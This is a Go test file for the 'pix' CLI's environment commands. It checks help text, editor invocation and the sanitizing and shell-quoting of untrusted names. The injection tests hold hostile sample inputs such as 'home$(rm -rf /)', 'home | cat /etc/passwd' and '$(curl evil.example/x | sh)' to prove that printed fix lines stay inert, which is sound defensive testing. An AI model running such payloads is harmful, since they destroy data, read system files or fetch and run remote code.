		{[]string{"env", "rm"}, envRmPointerError(rmPointerFallbackName)},
		{[]string{"env", "rm", "home"}, envRmPointerError("home")},
		{[]string{"env", "rm", "--force", "home"}, envRmPointerError("home")},
	} {
		d2, out2, errb2 := freshDeps()
		code := dispatch(tc.argv, d2)
		if code != 2 {
			t.Errorf("dispatch(%v) = %d, want 2", tc.argv, code)
		}
		if out2.String() != "" {
			t.Errorf("dispatch(%v) stdout = %q, want nothing", tc.argv, out2.String())
		}
		if errb2.String() != tc.want {
			t.Errorf("dispatch(%v) stderr = %q, want the exact pointer error %q", tc.argv, errb2.String(), tc.want)
		}
	}

	afterConfig, err := os.ReadFile(config.Path())
	if err != nil {
		t.Fatal(err)
	}
	if string(afterConfig) != string(beforeConfig) {
		t.Errorf("config.toml changed after `pix env rm`; before %q, after %q", beforeConfig, afterConfig)
	}
	afterSource, err := os.ReadFile(sentinel)
	if err != nil {
		t.Fatal(err)
	}
	if string(afterSource) != string(beforeSource) {
		t.Errorf("environment source changed after `pix env rm`")
	}

	ts, err := os.ReadDir(filepath.Dir(config.Path()))
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range ts {
		if e.Name() == "environment-trust.json" {
			t.Errorf("`pix env rm` must never create the environment trust store")
		}
	}
}

// TestRmPointerName_SkipsFlagsFindsFirstPositional proves the "first
// non-flag token" picking rule directly, at every arg-shape rmPointerName
// actually has to handle: a plain name, a name after one or more leading
// flags, only flags (no candidate at all), and empty argv.
func TestRmPointerName_SkipsFlagsFindsFirstPositional(t *testing.T) {
	for _, tc := range []struct {
		args []string
		want string
	}{
		{nil, rmPointerFallbackName},
		{[]string{}, rmPointerFallbackName},
		{[]string{"--force"}, rmPointerFallbackName},
		{[]string{"home"}, "home"},
		{[]string{"--force", "home"}, "home"},
		{[]string{"-f", "--yes", "work"}, "work"},
	} {
		if got := rmPointerName(tc.args); got != tc.want {
			t.Errorf("rmPointerName(%v) = %q, want %q", tc.args, got, tc.want)
		}
	}
}

// TestSanitizeRmPointerName_DropsControlCharsAndCapsLength is finding C9's
// display-safety proof: envRmCmd never reads or validates its argv against
// the real environment registry (this file's own doc comment on
// envRmCmd), so a name typed here is untrusted text echoed straight into a
// two-line diagnostic. A bare newline/CR must never forge an extra line of
// terminal output, an ESC must never start an escape sequence, and a
// pathologically long argv must never blow the message up unbounded.
func TestSanitizeRmPointerName_DropsControlCharsAndCapsLength(t *testing.T) {
	if got := sanitizeRmPointerName("ab\ncd\rgh"); got != "abcdgh" {
		t.Errorf("sanitizeRmPointerName(newline+CR) = %q, want %q (control chars dropped, not replaced)", got, "abcdgh")
	}
	if got := sanitizeRmPointerName("pix:\x1b[31mFAKE ERROR\x1b[0m"); strings.ContainsRune(got, '\x1b') {
		t.Errorf("sanitizeRmPointerName(ESC) = %q, want the escape byte dropped", got)
	}
	long := strings.Repeat("a", rmPointerMaxNameLen+50)
	if got := sanitizeRmPointerName(long); len([]rune(got)) != rmPointerMaxNameLen {
		t.Errorf("sanitizeRmPointerName(len %d) = len %d, want capped at %d", len(long), len([]rune(got)), rmPointerMaxNameLen)
	}
	// Negative control: ordinary safe text passes through unchanged.
	if got := sanitizeRmPointerName("stage-2.prod_env"); got != "stage-2.prod_env" {
		t.Errorf("sanitizeRmPointerName(clean) = %q, want it unchanged", got)
	}
}

// TestEnvRm_ControlCharArgNeverForgesExtraOutputLine is the same C9 proof
// end to end through dispatch: a name containing a newline must never let
// the rm pointer's stderr grow an extra line, or split "pix env forget"
// away from the name it belongs to.
func TestEnvRm_ControlCharArgNeverForgesExtraOutputLine(t *testing.T) {
	envDeps(t)
	d, _, errb := freshDeps()
	code := dispatch([]string{"env", "rm", "home\nFAKE: this is not real"}, d)
	if code != 2 {
		t.Fatalf("dispatch = %d, want 2", code)
	}
	got := errb.String()
	if strings.Count(got, "\n") != strings.Count(envRmPointerError(rmPointerFallbackName), "\n") {
		t.Errorf("stderr = %q, want exactly the pointer error's own line count (no forged extra line)", got)
	}
	// The sanitized (newline-dropped) name "homeFAKE: this is not real"
	// contains a space, which sys.ShellQuote does not treat as a safe bare
	// token, so it is single-quoted the same as any other unsafe copy-paste
	// text (this file's own TestEnvRmPointerError_ShellQuotesMetacharacters
	// pins that quoting rule directly); this test's own job is only the
	// control-char/line-count proof above, so it accepts either spelling.
	want := "pix env forget " + sys.ShellQuote("homeFAKE: this is not real")
	if !strings.Contains(got, want) {
		t.Errorf("stderr = %q, want %q inline", got, want)
	}
}

// TestEnvRmPointerError_ShellQuotesMetacharacters is C9's follow-up finding:
// an untrusted NAME containing shell metacharacters must never let the
// printed fix line, if copy-pasted verbatim into a real shell, run anything
// beyond `pix env forget`/`pix rm` themselves. sys.ShellQuote runs on the
// already-sanitized name (control characters already gone) before either
// interpolation, so a `$(...)` command substitution, a `;` command
// separator, a backtick substitution, and a `|` pipe are all folded into
// ONE single-quoted, syntactically inert argv token — never executed,
// never split into a second command.
func TestEnvRmPointerError_ShellQuotesMetacharacters(t *testing.T) {
	for _, name := range []string{
		"home$(rm -rf /)",
		"home; rm -rf /",
		"home`whoami`",
		"home | cat /etc/passwd",
		"home && curl evil.example | sh",
	} {
		got := envRmPointerError(name)
		q := sys.ShellQuote(name)
		if !strings.Contains(got, "pix env forget "+q+"   ") {
			t.Errorf("envRmPointerError(%q) = %q, want the shell-quoted forget line %q", name, got, q)
		}
		if !strings.Contains(got, "pix rm pix-repo-"+q+"   ") {
			t.Errorf("envRmPointerError(%q) = %q, want the shell-quoted rm line %q", name, got, q)
		}
		// The raw, unquoted metacharacter text must never appear on its own
		// (only inside the single-quoted token) — a bare `$(rm -rf /)` sitting
		// next to `pix env forget ` with no quote in between would still be
		// live to a shell.
		if strings.Contains(got, "forget "+name+"   ") {
			t.Errorf("envRmPointerError(%q) = %q, name leaked unquoted", name, got)
		}
	}
}

// TestEnvRmPointerError_QuotedInjectionIsInertUnderShellTokenizer is C9's
// end-to-end proof for the exact scenario the review finding named: a
// caller typos `pix env rm` with a command-substitution payload as the
// argv (the classic copy-paste-and-run mistake), and the fix line pix
// prints back must tokenize, under a real POSIX shell's own quoting rules,
// to the SAME single literal argument — never to a second command, and
// never expanding `$(...)` at all, because it never leaves the single
// quotes sys.ShellQuote wrapped it in. sys.ShellSplit (this package's own
// dependency-free POSIX tokenizer, sys/shellsplit.go) performs no command
// substitution or expansion of its own either, so round-tripping through it
// is exactly the property a real shell also guarantees for single-quoted
// text: what is inside '...' is literal, full stop.
func TestEnvRmPointerError_QuotedInjectionIsInertUnderShellTokenizer(t *testing.T) {
	const payload = "$(curl evil.example/x | sh)"
	got := envRmPointerError(payload)
	lines := strings.Split(strings.TrimRight(got, "\n"), "\n")
	if len(lines) != 4 {
		t.Fatalf("envRmPointerError(%q) has %d lines, want 4:\n%s", payload, len(lines), got)
	}
	// Each fix line is `pix env forget NAME   <trailing prose>` /
	// `pix rm pix-repo-NAME   <trailing prose>` — the trailing prose is
	// ordinary unquoted words a shell splits on whitespace same as always,
	// so the payload's OWN token position (argv[2] / argv[2], the fourth
	// and third words respectively) is what must survive intact, not
	// necessarily the last token of the whole line.
	forgetLine := strings.TrimSpace(lines[1])
	argv, err := sys.ShellSplit(forgetLine)
	if err != nil {
		t.Fatalf("ShellSplit(%q): %v (the quoted fix line must itself be valid, balanced shell syntax)", forgetLine, err)
	}
	if len(argv) < 4 || argv[3] != payload {
		t.Errorf("ShellSplit(%q) = %v, want argv[3] to equal the ORIGINAL payload %q unchanged — inert, not expanded, and one single token despite the embedded spaces/pipe", forgetLine, argv, payload)
	}
	rmLine := strings.TrimSpace(lines[2])
	argv, err = sys.ShellSplit(rmLine)
	if err != nil {
		t.Fatalf("ShellSplit(%q): %v", rmLine, err)
	}
	wantTail := "pix-repo-" + payload
	if len(argv) < 3 || argv[2] != wantTail {
		t.Errorf("ShellSplit(%q) = %v, want argv[2] to equal %q as one token", rmLine, argv, wantTail)
	}
}

// TestEnvRmPointerError_SandboxNamingIsFrozenPRDContractNotCurrentNaming
// pins C9/PRD §5.5's `pix rm pix-repo-<name>` literal against the review
// temptation to "correct" it to match today's actual sandbox naming: this
// proves the two are DIFFERENT strings on purpose. No env-driven launch
// exists yet (Wave D; see workflow/env/forget.go's identical note), so
// `pix-repo-work` names no sandbox anything in this tree can create today
// — it is spec text for a future contract, not a description of
// sandbox.Name's present, digest-suffixed output.
func TestEnvRmPointerError_SandboxNamingIsFrozenPRDContractNotCurrentNaming(t *testing.T) {
	got := envRmPointerError("work")
	if !strings.Contains(got, "pix rm pix-repo-work") {
		t.Errorf("envRmPointerError(work) = %q, want the frozen PRD \u00a75.5 literal `pix rm pix-repo-work`", got)
	}
	if got := sandbox.Name("work"); got == "pix-repo-work" {
		t.Fatalf("sandbox.Name(work) = %q, want it to differ from pix-repo-work (this test's premise: today's generic naming and the PRD's future environment-sandbox contract are deliberately different strings, so the rm pointer's literal must not be \"corrected\" to match sandbox.Name's current output)", got)
	}
}

// TestEnvRm_AbsentFromHelp checks only the generated "Commands:" block (the
// actual verb LISTING, one dispatchable node per line) rather than the
// whole help text: envCmd's own Help() prose deliberately NAMES `pix env
// rm` to explain why it does not exist (this file's `envRmPointerError`
// wording), exactly as the design doc's own help text does, so asserting
// "the substring `rm` never appears anywhere" would fail on that correct,
// intentional sentence. `hidden:""` (envCmd's Rm field) is what this test
// actually proves: rm dispatches (TestEnvRm_IsAPointerErrorWithZeroMutation)
// but never appears as a listed command.
func TestEnvRm_AbsentFromHelp(t *testing.T) {
	var out bytes.Buffer
	d := &cli.Deps{Out: &out, Err: &out}
	if err := cli.RunRoot[envCmd]("pix env", "", "", []string{"--help"}, d); err != nil {
		t.Fatalf("env --help: %v", err)
	}
	idx := strings.Index(out.String(), "Commands:")
	if idx < 0 {
		t.Fatalf("pix env --help has no \"Commands:\" block:\n%s", out.String())
	}
	commands := out.String()[idx:]
	for _, line := range strings.Split(commands, "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "rm" || strings.HasPrefix(trimmed, "rm ") || strings.HasPrefix(trimmed, "rm<") || strings.HasPrefix(trimmed, "rm[") {
			t.Errorf("pix env --help lists `rm` as a command:\n%s", commands)
		}
	}
}

func TestEnvRm_HelpListsExactlySevenWorkingVerbs(t *testing.T) {
	var out bytes.Buffer
	d := &cli.Deps{Out: &out, Err: &out}
	if err := cli.RunRoot[envCmd]("pix env", "", "", []string{"--help"}, d); err != nil {
		t.Fatalf("env --help: %v", err)
	}
	got := out.String()
	for _, verb := range []string{"ls", "add", "use", "show", "edit", "review", "forget"} {
		if !strings.Contains(got, " "+verb+" ") && !strings.Contains(got, " "+verb+"\n") {
			t.Errorf("pix env --help missing wired verb %q:\n%s", verb, got)
		}
	}
	if strings.Contains(got, " rm ") || strings.Contains(got, " rm\n") {
		t.Errorf("pix env --help must never list `rm` as a verb:\n%s", got)
	}
}

// TestEnvUse_HelpNamesTheActualGate is finding C12: `use`'s help must say
// what Use (use.go) ACTUALLY refuses — an unaccepted or changed
// host-executing environment — not the looser "unreviewed" wording that
// reads as if EVERY environment needs review; an environment that runs
// nothing on the host never gates here at all. The plain-language DX pass
// keeps that same precision ("runs code on your host", never a bare
// "unreviewed") without the internal "Tier1" vocabulary a reader never had
// to learn.
func TestEnvUse_HelpNamesTheActualGate(t *testing.T) {
	var out bytes.Buffer
	d := &cli.Deps{Out: &out, Err: &out}
	if err := cli.RunRoot[envCmd]("pix env", "", "", []string{"use", "--help"}, d); err != nil {
		t.Fatalf("env use --help: %v", err)
	}
	got := out.String()
	if strings.Contains(got, "unreviewed") {
		t.Errorf("pix env use --help = %q, must not say \"unreviewed\" (Use never gates an environment that runs nothing on the host)", got)
	}
	if strings.Contains(got, "Tier1") || strings.Contains(got, "Tier0") {
		t.Errorf("pix env use --help = %q, must never name the internal Tier1/Tier0 vocabulary", got)
	}
	if !strings.Contains(got, "runs code on your host") {
		t.Errorf("pix env use --help = %q, want it to name the actual gate in plain language", got)
	}
}

// ── env edit: E1.12, through the SAME kong dispatch production uses ──────

// envEditDeps is envDeps plus a systest.Fake wired as d.Sys, so `env edit`
// dispatch tests can control $VISUAL/$EDITOR and the editor invocation
// without ever spawning a real process.
func envEditDeps(t *testing.T, fake *systest.Fake) (*cli.Deps, *bytes.Buffer, *bytes.Buffer) {
	t.Helper()
	d, out, errb := envDeps(t)
	d.Sys = fake
	return d, out, errb
}

func noEditorEditFake() *systest.Fake {
	return &systest.Fake{GetenvFn: func(string) string { return "" }}
}

// TestEnvEdit_TargetTokenTable is the dispatch-level analog of
// workflow/env/edit_test.go's TestEdit_TargetTokenTable: the exact
// positional enum, through kong argv parsing.
func TestEnvEdit_TargetTokenTable(t *testing.T) {
	for _, tc := range []struct {
		name string
		argv []string
		want string // "" means success
	}{
		{name: "pix", argv: []string{"env", "edit", "work", "pix"}, want: ""},
		{name: "sbxenv", argv: []string{"env", "edit", "work", "sbxenv"}, want: ""},
		{name: "unrecognized", argv: []string{"env", "edit", "work", "yaml"}, want: `unknown target "yaml"`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			d, out, errb := envEditDeps(t, noEditorEditFake())
			d.Interactive = false
			registerTier0Env(t, "work")
			code := dispatch(tc.argv, d)
			if tc.want == "" {
				if code != 0 {
					t.Fatalf("dispatch(%v) = %d, want 0 (stderr: %s)", tc.argv, code, errb.String())
				}
				return
			}
			if code != 2 {
				t.Fatalf("dispatch(%v) = %d, want 2 (stdout: %s)", tc.argv, code, out.String())
			}
			if !strings.Contains(errb.String(), tc.want) {
				t.Errorf("stderr = %q, want it to contain %q", errb.String(), tc.want)
			}
			if !strings.Contains(errb.String(), "pix env edit work pix") || !strings.Contains(errb.String(), "pix env edit work sbxenv") {
				t.Errorf("stderr = %q, want both explicit forms named", errb.String())
			}
		})
	}
}

// TestEnvEdit_NonTTYNoTargetExitsTwo: no token, no TTY -> exit 2 naming both
// explicit forms (AC-50), through the real kong-parsed positional (which
// leaves Target == "" since it is `optional:""`).
func TestEnvEdit_NonTTYNoTargetExitsTwo(t *testing.T) {
	d, _, errb := envEditDeps(t, noEditorEditFake())
	d.Interactive = false
	registerTier0Env(t, "work")
	code := dispatch([]string{"env", "edit", "work"}, d)
	if code != 2 {
		t.Fatalf("dispatch = %d, want 2 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(errb.String(), "pix env edit work pix") || !strings.Contains(errb.String(), "pix env edit work sbxenv") {
		t.Errorf("stderr = %q, want both explicit forms named", errb.String())
	}
}

// TestEnvEdit_TTYNoTargetPromptsAndReadsChoice: same, but a TTY reads one
// bounded choice off d.In instead of refusing.
func TestEnvEdit_TTYNoTargetPromptsAndReadsChoice(t *testing.T) {
	d, out, errb := envEditDeps(t, noEditorEditFake())
	d.Interactive = true
	d.In = strings.NewReader("sbxenv\n")
	root := registerTier0Env(t, "work")
	code := dispatch([]string{"env", "edit", "work"}, d)
	if code != 0 {
		t.Fatalf("dispatch = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), "which file? [pix/sbxenv]: ") {
		t.Errorf("stdout = %q, want the selection prompt", out.String())
	}
	if want := filepath.Join(root, ".sbxenv.yaml") + "\n"; !strings.HasSuffix(out.String(), want) {
		t.Errorf("stdout = %q, want it to end with %q (no editor configured)", out.String(), want)
	}
}

// TestEnvEdit_BothUnsetPrintsPathAndExitsZero exercises §8.1's exit-code
// scheme's own example verbatim: "0 only for a completed operation,
// including printing a path because $EDITOR was unset".
func TestEnvEdit_BothUnsetPrintsPathAndExitsZero(t *testing.T) {
	d, out, errb := envEditDeps(t, noEditorEditFake())
	d.Interactive = false
	root := registerTier0Env(t, "work")
	code := dispatch([]string{"env", "edit", "work", "sbxenv"}, d)
	if code != 0 {
		t.Fatalf("dispatch = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if want := filepath.Join(root, ".sbxenv.yaml") + "\n"; out.String() != want {
		t.Errorf("stdout = %q, want ONLY %q", out.String(), want)
	}
}

// TestEnvEdit_ArgvSpacesNoShell: a multi-word $EDITOR is split into a real
// argv and invoked directly (RunInteractive, never a shell).
func TestEnvEdit_ArgvSpacesNoShell(t *testing.T) {
	fake := &systest.Fake{
		GetenvFn:         func(string) string { return "myeditor --wait --flag" },
		RunInteractiveFn: func(string, ...string) error { return nil },
	}
	d, _, errb := envEditDeps(t, fake)
	d.Interactive = false
	root := registerTier0Env(t, "work")
	code := dispatch([]string{"env", "edit", "work", "pix"}, d)
	if code != 0 {
		t.Fatalf("dispatch = %d, want 0 (stderr: %s)", code, errb.String())
	}
	want := "myeditor --wait --flag " + filepath.Join(root, "pix.toml")
	if len(fake.Calls) != 1 || fake.Calls[0] != want {
		t.Errorf("fake.Calls = %v, want exactly [%q]", fake.Calls, want)
	}
}

// TestEnvEdit_EditorFailureIsOperationalNonTwo: through dispatch, the exit
// code an editor failure surfaces as is non-zero and NOT 2 (a refusal), the
// same distinction env_cmd.go's envRun preserves via cli.ExitCode.
func TestEnvEdit_EditorFailureIsOperationalNonTwo(t *testing.T) {
	fake := &systest.Fake{
		GetenvFn:         func(string) string { return "brokeneditor" },
		RunInteractiveFn: func(string, ...string) error { return errors.New("exit status 127") },
	}
	d, _, errb := envEditDeps(t, fake)
	d.Interactive = false
	registerTier0Env(t, "work")
	code := dispatch([]string{"env", "edit", "work", "sbxenv"}, d)
	if code == 0 || code == 2 {
		t.Fatalf("dispatch = %d, want a non-zero, non-2 operational code", code)
	}
	if !strings.Contains(errb.String(), "brokeneditor") {
		t.Errorf("stderr = %q, want it to name the editor", errb.String())
	}
}

// TestEnvEdit_VerdictOkReviewInvalid runs all three PRD §5.4 verdicts
// through dispatch, over a no-op editor that either leaves the file
// untouched (ok/review) or corrupts it (invalid).
func TestEnvEdit_VerdictOkReviewInvalid(t *testing.T) {
	t.Run("ok: accepted and unchanged", func(t *testing.T) {
		fake := &systest.Fake{
			GetenvFn:         func(string) string { return "true" },
			RunInteractiveFn: func(string, ...string) error { return nil },
		}
		d, _, errb := envEditDeps(t, fake)
		d.Interactive = false
		// A Tier0 fixture's `env review` never writes a record at all (there
		// is nothing to review), so a real accepted-and-unchanged verdict
		// needs the Tier1 host-exec fixture the review tests already use.
		registerHostExecEnv(t, "work")
		// Accept the environment as-is, over the SAME scratch config/trust
		// store the subsequent edit dispatch reads.
		if code := dispatch([]string{"env", "review", "work", "--yes"}, d); code != 0 {
			t.Fatalf("env review work --yes = %d, want 0 (stderr: %s)", code, errb.String())
		}
		d2, out2, errb2 := freshDeps()
		d2.Sys = fake
		d2.Interactive = false
		code := dispatch([]string{"env", "edit", "work", "sbxenv"}, d2)
		if code != 0 {
			t.Fatalf("dispatch = %d, want 0 (stderr: %s)", code, errb2.String())
		}
		if !strings.Contains(out2.String(), "pix env use work") {
			t.Errorf("stdout = %q, want the ok verdict", out2.String())
		}
	})

	t.Run("review: never accepted", func(t *testing.T) {
		fake := &systest.Fake{
			GetenvFn:         func(string) string { return "true" },
			RunInteractiveFn: func(string, ...string) error { return nil },
		}
		d, out, errb := envEditDeps(t, fake)
		d.Interactive = false
		// A Tier0 fixture can never sit unaccepted (review.go's own Review
		// writes no record for it at all, and postEditVerdict's Tier0 branch
		// says "ok" unconditionally): the never-accepted "review" verdict is
		// only real for a Tier1 host-exec fixture nobody has run `env review`
		// against yet.
		registerHostExecEnv(t, "work")
		code := dispatch([]string{"env", "edit", "work", "sbxenv"}, d)
		if code != 0 {
			t.Fatalf("dispatch = %d, want 0 (stderr: %s)", code, errb.String())
		}
		if !strings.Contains(out.String(), "pix env review work") {
			t.Errorf("stdout = %q, want the review verdict", out.String())
		}
	})

	t.Run("ok: Tier0 with no acceptance record at all", func(t *testing.T) {
		// E1.12 pre-merge BLOCK fix (finding 3): a Tier0 environment must
		// verdict "ok" even though it was never run through `env review` —
		// there is nothing for review to accept in the first place.
		fake := &systest.Fake{
			GetenvFn:         func(string) string { return "true" },
			RunInteractiveFn: func(string, ...string) error { return nil },
		}
		d, out, errb := envEditDeps(t, fake)
		d.Interactive = false
		registerTier0Env(t, "work")
		code := dispatch([]string{"env", "edit", "work", "sbxenv"}, d)
		if code != 0 {
			t.Fatalf("dispatch = %d, want 0 (stderr: %s)", code, errb.String())
		}
		if !strings.Contains(out.String(), "pix env use work") {
			t.Errorf("stdout = %q, want the ok verdict", out.String())
		}
		if strings.Contains(out.String(), "pix env review") {
			t.Errorf("stdout = %q, must never point a Tier0 environment at review", out.String())
		}
	})

	t.Run("invalid: corrupted by the editor", func(t *testing.T) {
		var root string
		fake := &systest.Fake{
			GetenvFn: func(string) string { return "true" },
			RunInteractiveFn: func(string, ...string) error {
				return os.WriteFile(filepath.Join(root, ".sbxenv.yaml"),
					[]byte("schemaVersion: \"1\"\nagent: pix\nnot_a_real_field: true\n"), 0o644)
			},
		}
		d, out, errb := envEditDeps(t, fake)
		d.Interactive = false
		root = registerTier0Env(t, "work")
		code := dispatch([]string{"env", "edit", "work", "sbxenv"}, d)
		if code != 0 {
			t.Fatalf("dispatch = %d, want 0 (stderr: %s)", code, errb.String())
		}
		if !strings.Contains(out.String(), "next: pix env edit work sbxenv") {
			t.Errorf("stdout = %q, want the invalid verdict's re-edit command", out.String())
		}
	})
}

// TestEnvEdit_NoSbxenvFlagInHelp: the ONLY spelling of the native-file
// target anywhere in `pix env edit --help`'s live usage text is the
// positional "sbxenv", never a "--sbxenv" flag.
func TestEnvEdit_NoSbxenvFlagInHelp(t *testing.T) {
	d, out, errb := envDeps(t)
	if code := dispatch([]string{"env", "edit", "--help"}, d); code != 0 {
		t.Fatalf("pix env edit --help = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if strings.Contains(out.String(), "--sbxenv") {
		t.Errorf("help text = %q, must never advertise a --sbxenv flag", out.String())
	}
}

// TestEnvUseHelp_PlainLanguageNoTier1 proves `pix env use --help` describes
// the refusal in plain language a reader never had to learn pix's internal
// tier vocabulary for: an environment that runs code on the host requires
// review, and a changed footprint is refused. "Tier1" (or "Tier0") never
// appears anywhere in the live help text.
func TestEnvUseHelp_PlainLanguageNoTier1(t *testing.T) {
	d, out, errb := envDeps(t)
	if code := dispatch([]string{"env", "use", "--help"}, d); code != 0 {
		t.Fatalf("pix env use --help = %d, want 0 (stderr: %s)", code, errb.String())
	}
	got := out.String()
	if strings.Contains(got, "Tier1") || strings.Contains(got, "Tier0") {
		t.Errorf("pix env use --help = %q, must never name the internal Tier1/Tier0 vocabulary", got)
	}
	for _, want := range []string{"runs code on your host", "reviewed", "footprint changed"} {
		if !strings.Contains(got, want) {
			t.Errorf("pix env use --help = %q, want it to contain %q", got, want)
		}
	}
}
